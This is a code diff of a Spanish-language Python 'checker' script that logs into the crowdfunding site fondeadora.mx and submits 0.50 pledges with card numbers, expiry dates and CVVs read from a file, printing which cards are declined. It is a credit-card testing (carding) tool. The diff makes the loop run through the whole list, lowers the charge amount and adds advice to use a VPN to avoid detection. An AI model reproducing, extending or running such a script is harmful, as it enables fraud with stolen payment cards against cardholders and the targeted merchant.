@@ -22,7 +22,7 @@ print "	  88   88  88~~~88    88    88b      	88b     88    88  ";
 print "	  88   88  88   88  NNNNNN  88NNNN   	88NNNN  88    88  ";
 
 print "	  ======================================================\n\n";
-print "		      Uso: python checker.py archivo.txt\n\n";
+print "		  Uso: python checker.py cc ano mes cvv\n\n";
 
 br = mechanize.Browser()
 response = br.open('https://fondeadora.mx/login.html')
@@ -45,17 +45,72 @@ if (br.geturl() == "https://fondeadora.mx/login.html"):
 	br.submit()
 
 contador = 0
+limite = 1
 
 lista = sys.argv[1]
 ccs = open(lista ,'r')
 
 try:
-	while contador <= 50:
+	while contador <= limite :
 
 		cc, mes, ano, cvv = ccs.next().rstrip("\n").split("|")
 
-		response = br.open('https://fondeadora.mx/projects/animalpolitico/backers/new?reward=0&backing_amount=5&continue=Continuar')
-		urlchecker = 'https://fondeadora.mx/projects/animalpolitico/backers/new?reward=0&backing_amount=5&continue=Continuar'
+		if (mes == "09"):
+			mes = mes.strip("0")
+
+		else:
+			pass
+
+		if (mes == "08"):
+			mes = mes.strip("0")
+
+		else:
+			pass
+
+		if (mes == "07"):
+			mes = mes.strip("0")
+
+		else:
+			pass
+
+		if (mes == "06"):
+			mes = mes.strip("0")
+
+		else:
+			pass
+
+		if (mes == "05"):
+			mes = mes.strip("0")
+
+		else:
+			pass
+
+		if (mes == "04"):
+			mes = mes.strip("0")
+
+		else:
+			pass
+
+		if (mes == "03"):
+			mes = mes.strip("0")
+
+		else:
+			pass
+
+		if (mes == "02"):
+			mes = mes.strip("0")
+
+		else:
+			pass
+
+		if (mes == "01"):
+			mes = mes.strip("0")
+
+		else:
+			pass
+
+		response = br.open('https://fondeadora.mx/projects/animalpolitico/backers/new?reward=0&backing_amount=0.50&continue=Continuar')
+		urlchecker = 'https://fondeadora.mx/projects/animalpolitico/backers/new?reward=0&backing_amount=0.50&continue=Continuar'
 		urlpass = br.geturl()
 
 		br.select_form(nr=2)
@@ -76,10 +131,11 @@ try:
 			print "  DIE  " + cc + "\n"
 
 		contador = contador + 1
+		limite = limite + 1
 
 except:
 
-	print "  El Checker Ha Terminado :) "
+	print "  El Checker Ha Terminado :) \n  Si Tuviste Algun Error Recuerda Usar VPN"
 
 exit()
 
